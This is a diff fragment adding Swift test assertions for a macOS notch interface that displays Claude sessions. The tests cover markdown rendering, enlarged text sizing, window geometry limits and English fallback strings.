+        suite.expect(String(rendered.characters) == "Fixed two bugs in NotchView\n- one line",
+                     "markdown marks leave the reply and its line breaks stay: \(String(rendered.characters))")
+        suite.expect(rendered.runs.contains { $0.inlinePresentationIntent?.contains(.stronglyEmphasized) == true }
+                     && rendered.runs.contains { $0.inlinePresentationIntent?.contains(.code) == true },
+                     "bold reads as bold and code as code")
+        suite.expect(String(NotchClaudeSessionsSupport.markdown("half **open").characters).contains("half"),
+                     "text that does not parse still shows")
+
+        suite.expect(NotchClaudeSessionsSupport.largeTextSize(40) == 24 && NotchClaudeSessionsSupport.largeTextSize(3) == 12
+                     && NotchClaudeSessionsSupport.largeTextSize(.nan) == 15 && NotchClaudeSessionsSupport.largeTextSize(15.4) == 15,
+                     "the enlarged page's text size stays within its range")
+        var island = NotchGeometry(screen: CGRect(x: 0, y: 0, width: 1512, height: 982), safeAreaTop: 32, cameraWidth: 180)
+        let usual = island.expandedSize(module: .sessions)
+        island.enlarged = true
+        let grown = island.expandedSize(module: .sessions)
+        suite.expect(grown.width > usual.width + 200 && grown.height > usual.height + 200,
+                     "an enlarged session grows the island: \(usual) → \(grown)")
+        suite.expect(grown.width <= 1512 - 24 && grown.height <= 982 - 48 && grown.width <= 1180,
+                     "and stays on the screen at a readable width")
+
+        let strings = FeatureStrings.notchClaudeSessions(.de)
+        suite.expect(strings.title == NotchClaudeSessionStrings.enUS.title, "every language reads the English text for now")
+        suite.expect(strings.tasks(done: 2, total: 5) == "2 of 5 tasks", "task progress formats both numbers")
+    }
+}
